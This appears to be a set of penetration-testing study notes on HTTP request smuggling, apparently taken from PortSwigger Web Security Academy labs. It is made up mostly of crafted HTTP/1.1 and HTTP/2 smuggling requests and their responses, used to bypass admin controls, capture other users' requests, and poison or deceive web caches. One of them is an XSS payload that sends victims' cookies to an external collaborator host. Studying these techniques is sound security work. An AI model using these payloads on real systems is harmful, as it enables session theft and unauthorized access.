# Content
- [HTTP 1.1 request smuggling Types](#http-11-request-smuggling-types)
  - [CL.TE](#clte)
      - [Finding CL.TE](#finding-clte)
          - [using differential responses](#using-differential-responses)
          - [using time delay](#using-time-delay)
  - [TE.CL](#tecl)
      - [Finding TE.CL](#finding-tecl)
          - [using differential responses](#using-differential-responses-1)
          - [using time delay](#using-time-delay-1)
- [HTTP 2 request smuggling Types](#http-2-request-smuggling-types)
  - [H2.CL](#h2cl)
  - [H2.TE](#h2te)
- [Response queue poisoning](#response-queue-poisoning-source)
- [Request smuggling via CRLF injection](#request-smuggling-via-crlf-injection)
- [Request smuggling HTTP/2 request splitting](#request-smuggling-http2-request-splitting)

- [Exploiting HTTP request smuggling vulnerabilities](#exploiting-http-request-smuggling-vulnerabilities)
  - [bypass front-end security controls](#bypass-front-end-security-controls)
  - [Revealing front-end request rewriting](#revealing-front-end-request-rewriting)
  - [Capturing other users' requests](#capturing-other-users-requests)
  - [reflected XSS to Stored XSS](#reflected-xss-to-stored-xss)
  - [Turn an on-site redirect into an open redirect](#turn-an-on-site-redirect-into-an-open-redirect)
  - [Turning root-relative redirects into open redirects](#turning-root-relative-redirects-into-open-redirects)
  - [Perform web cache poisoning](#perform-web-cache-poisoning)
  - [Perform web cache deception](#perform-web-cache-deception)



## HTTP 1.1 request smuggling Types 
### CL.TE
the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding
#### Finding CL.TE
##### using differential responses
- request
```http
POST / HTTP/1.1
Host: 0a6500df03127c4d814e75e300a100a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Transfer-Encoding: chunked

0

G

```
- response
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```
**OR**
- request
```http
POST / HTTP/1.1
Host: 0a6500df03127c4d814e75e300a100a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Content-Length: 15


```
- response
```http
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=xoMJbTEes2ryW1PlMaosC136QVh3RPWo; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```



##### using time delay
- request
```http
POST / HTTP/1.1
Host: 0a6500df03127c4d814e75e300a100a0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7
A
xxx

```
- response
```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```

### TE.CL
the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header
#### Finding TE.CL
##### using differential responses
- request
```http
POST / HTTP/1.1
Host: 0a3200cf04cedd8280132134009f00db.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

28
GPOST / HTTP/1.1
Content-Length: 15


0


```
- response
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```
**OR**
- request
```http
POST / HTTP/1.1
Host: 0a1400a9045d90718087850f0092005f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

29
GET /404 HTTP/1.1
Content-Length: 15


0


```
- response
```http
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=ZxP5vPp2QyzeBn8FJ2Xa6RzpmF1bO84D; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

##### using time delay
- request
```http
POST / HTTP/1.1
Host: 0a1400a9045d90718087850f0092005f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
- response
```http
HTTP/1.1 500 Internal Server Error
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 125

<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
```

## HTTP 2 request smuggling Types 
### H2.CL
When frontend server use the `Content-Length` Header to set the length of the message while `downgrading` to HTTP 1.1
- example to get access to admin page
```
POST / HTTP/2
Host: vulnerable-website.com
Cookie: session=SPomJ7pQ3Oix3yyWMVAHnt3zu7m6j1NR
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 5

s=s
```
### H2.TE 
When frontend server use the `transfer-encoding` Header to set the length of the message while `downgrading` to HTTP 1.1
- example to get access to admin page
```
POST / HTTP/2
Host: vulnerable-website.com
Cookie: session=SPomJ7pQ3Oix3yyWMVAHnt3zu7m6j1NR
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 5

s=s
```


## Response queue poisoning [source](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning)
This attack is possible both via classic HTTP/1 request smuggling and by exploiting HTTP/2 downgrading. 
#### How to contsruct an attack
- The TCP connection between the front-end server and back-end server is reused for multiple request/response cycles.

- The attacker is able to successfully smuggle a complete, standalone request that receives its own distinct response from the back-end server.

- The attack does not result in either server closing the TCP connection.



**Note:** Servers generally close incoming connections when they receive an invalid request because they can't determine where the request is supposed to end.


#### Steal users' responses 
![stealing-other-users-responses](https://github.com/kiro6/penetration-testing-notes/assets/57776872/26ca4a28-cd23-45ef-a7c4-9ba77aede775)

**Note:** To make it easier to differentiate stolen responses from responses to your own requests, try using a non-existent path in both of the requests that you send


**Response queue poisoning via H2.TE request smuggling**
- send smuggled attack
```http
POST / HTTP/2
Host: 0a7700ba0387efca807126d800a70016.web-security-academy.net
Cookie: session=d9Ne6NmaMRf2HWSoeh7hTutbwVMIKkpw
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: 0a7700ba0387efca807126d800a70016.web-security-academy.net


```

- wait and send another request to receive another user's response
```http
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=E6mupqkseGWnXaPfu3xDDL2cjgHRU9DG; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

## Request smuggling via CRLF injection
**To bypass basic H2.CL or H2.TE** attacks in HTTP/2. servers filter `Content-Length` and `Transfer-Encoding` headers , so inject CRLF in Headers using burp inspector open the header and press (Shift + Enter) to inject CRLF as binary 

- Front-end (HTTP/2)
```http
foo: bar\r\nTransfer-Encoding: chunked\r\nX: 	ignore
```

- Back-end (HTTP/1)
```http
Foo: bar\r\n
Transfer-Encoding: chunked\r\n
X: ignore\r\n
```
## Request smuggling HTTP/2 request splitting
Inject CRLF in Headers using burp inspector open the header and press (Shift + Enter) to inject CRLF as binary (EX: Response queue poisoning)

![Screenshot 2023-10-01 at 11-01-44 Advanced request smuggling Web Security Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/42db5224-e92c-4789-84a4-4344e7023645)

You will also need to adjust the positioning of any internal headers that you want to inject in a similar manner.

![Screenshot 2023-10-01 at 11-02-08 Advanced request smuggling Web Security Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/f28ce7bf-7e66-496f-9e07-f4fe69416b09)




## Exploiting HTTP request smuggling vulnerabilities
### bypass front-end security controls
- CL.TE
```http
POST / HTTP/1.1
Host: VulnWebsite
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
- TE.CL
```http
POST / HTTP/1.1
Host: VulnWebsite
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

### Revealing front-end request rewriting
In many applications, the front-end server modifies incoming requests before sending them to the back-end server by adding additional request headers. For instance, it may:

    Terminate the TLS connection and include headers describing the protocol and ciphers used.
    Add an X-Forwarded-For header with the user's IP address.
    Determine the user's ID from their session token and include a corresponding header.
    Add sensitive information relevant for certain attacks.

In some cases, if your smuggled requests lack headers typically added by the front-end server, the back-end server may not process them as expected, causing the smuggled requests to fail in achieving their intended objectives.

You can often uncover how the front-end server alters requests by following these steps:

    Identify a POST request that reflects a request parameter's value in the application's response.
    Rearrange the parameters so that the reflected parameter is the last one in the message body.
    Send this modified request to the back-end server, immediately followed by a regular request whose modified form you aim to reveal.



- request
```http
POST / HTTP/1.1
Host: 0a3600c5040f5ca884177e2b00110060.web-security-academy.net
Cookie: session=43WZAzODZhS7tshSG8vHxiOcDdUixfgM
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Transfer-Encoding: chunked

8
search=1
0

POST / HTTP/1.1
Content-Length: 300

search=
```
- response
```http
X-SoDAPc-Ip: 41.40.121.254
Host: 0a3600c5040f5ca884177e2b00110060.web-security-academy.net
Cookie: session=43WZAzODZhS7tshSG8vHxiOcDdUixfgM
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Transfer-Encoding: chunked
```
- attack
```http
POST / HTTP/1.1
Host: 0a3600c5040f5ca884177e2b00110060.web-security-academy.net
Cookie: session=43WZAzODZhS7tshSG8vHxiOcDdUixfgM
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Transfer-Encoding: chunked

8
search=1
0

GET /admin HTTP/1.1
Content-Length: 10
X-SoDAPc-Ip: 127.0.0.1


```
### Capturing other users' requests
- request
```http
POST /post/comment HTTP/1.1
Host: 0ad300f903097f52834a253900ca003a.web-security-academy.net
Cookie: session=56jZRHxyFe7HUHcSGQE9kQxFbSJpx0rQ
Content-Type: application/x-www-form-urlencoded
Content-Length: 353
Transfer-Encoding: chunked

7e
csrf=KTmPGWrjDRH23ANXPHZUFU7uqzWia0ZB&postId=4&name=hacker&email=hacker%40hack.com&website=http%3A%2F%2Ffake.com&comment=blbbl
0

POST /post/comment HTTP/1.1
Cookie: session=56jZRHxyFe7HUHcSGQE9kQxFbSJpx0rQ
Content-Length: 300

csrf=KTmPGWrjDRH23ANXPHZUFU7uqzWia0ZB&postId=4&name=carlos&email=hackerr@hack.com&website=http://fake.com&comment=
```
- wait for another user to make a request and you will find a comment with their request
```http
POST /post/comment HTTP/1.1 Host: 0ad300f903097f52834a253900ca003a.web-security-academy.net
Cookie: session=56jZRHxyFe7HUHcSGQE9kQxFbSJpx0rQ
Content-Type: application/x-www-form-urlencoded
Content-Length: 353 Transfer-Encoding: chunked 7e csrf=KTmPGWrjDRH23ANXPHZUFU7uqzWia0ZB
```
### reflected XSS to Stored XSS
```
1)It requires no interaction with victim users.
2)You don't need to feed them a URL and wait for them to visit it,
You just smuggle a request containing the XSS payload and the next user's request that is processed by the back-end server will be hit.
3)It can be used to exploit XSS behavior in parts of the request that cannot be trivially controlled in a normal reflected XSS attack, such as HTTP request headers.
```

- request
```http
POST / HTTP/1.1
Host: 0a6000ba044f324f82b0c961008a0018.web-security-academy.net
Cookie: session=8rkTvMtS8FYTUKBaYT1fbzQQ9LjRL4wY
Content-Type: application/x-www-form-urlencoded
Content-Length: 177
Transfer-Encoding: chunked

0

GET /post?postId=9 HTTP/1.1
User-Agent: "><script>location='http://awapn15squ47vsk973cd1d7xjopfd51u.oastify.com/?cookies='+document.cookie</script>
Content-Length: 40


```
- wait another user to make a request then the script will run on their browser (in our case send cookies to our server)
```http
GET /?cookies=secret=TeQVKzAQmjAvw0Fy5ZYRR2nQJVNYXbKX HTTP/1.1
Host: awapn15squ47vsk973cd1d7xjopfd51u.oastify.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

```
### Turn an on-site redirect into an open redirect
Many applications perform on-site redirects from one URL to another and place the hostname from the request's Host header into the redirect URL. 
**An example** of this is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder including the trailing slash:
```http
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
NOTE: if the user's request was for a JavaScript. The attacker can fully compromise the victim user by returning their own JavaScript in the response. 

- response
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
- wait for another to make a request then will be redirected 
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### Turning root-relative redirects into open redirects
```
1)In some cases, you may encounter server-level redirects that use the path to construct a root-relative URL
2)This can potentially still be used for an open redirect if the server lets you use a protocol-relative URL in the path
```
NOTE : if the user's request was for a JavaScript. The attacker can fully compromise the victim user by returning their own JavaScript in the response. 

- request
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET //attacker-website.com/example HTTP/1.1
Host: vulnerable-website.com

```
- wait for another to make a request then will be redirected
```http
HTTP/1.1 301 Moved Permanently
Location: //attacker-website.com/example/
```

### Perform web cache poisoning
1) search for : 
    - [Turn an on-site redirect into an open redirect](#turn-an-on-site-redirect-into-an-open-redirect)
    - [Turning root-relative redirects into open redirects](#turning-root-relative-redirects-into-open-redirects)
    - Open Redirect

2) Search for **static files** or **pages** that **web cached**
3) Send a smuggled request that will cause a redirect
4) follow it with the static file or page that will be cached
```
explain:
The smuggled request reaches the back-end server, which responds as before with the off-site redirect.
when you send static file or page that will be cached The front-end server caches this response against what it believes is the URL in the second request 
```
**EX:**
- send smuggled request
```http
POST / HTTP/1.1
Host: 0a4b001603fa601c84288b25008c0095.web-security-academy.net
Cookie: session=e5lMUxw5fHwFHQWQW2SZ2oe8oLgcKoak
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
Transfer-Encoding: chunked

0

GET /post/next?postId=2 HTTP/1.1     => redirect
Host: exploit-0a610039035b603c84078a7c01ca002a.exploit-server.net/exploit?test=
Content-Length: 10

x=1
```
- send the file that will be cached
```http
GET /resources/js/tracking.js HTTP/1.1
Host: 0a4b001603fa601c84288b25008c0095.web-security-academy.net
```
- check that it is chached and Location to your server 
```http
HTTP/1.1 302 Found
Location: https://exploit-0a610039035b603c84078a7c01ca002a.exploit-server.net/exploit?test=/post?postId=3
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 9
X-Cache: hit
Connection: close
```
- the response that contain your evil script
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Server: Academy Exploit Server
Content-Length: 22

alert(document.cookie)
```
### Perform web cache deception
**web cache deception**:the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache. 
- request that returns some sensitive user-specific content
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```
- The next request from another user that is forwarded to the back-end server will be appended to the smuggled request, including session cookies and other headers
- The front-end server caches this response against what it believes is the URL in the second request, which is /static/some-image.png
```http
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
<h1>Your private messages</h1>
...
```

**Note: you can also smuggle prefixes for classic request smuggling attacks in this way**
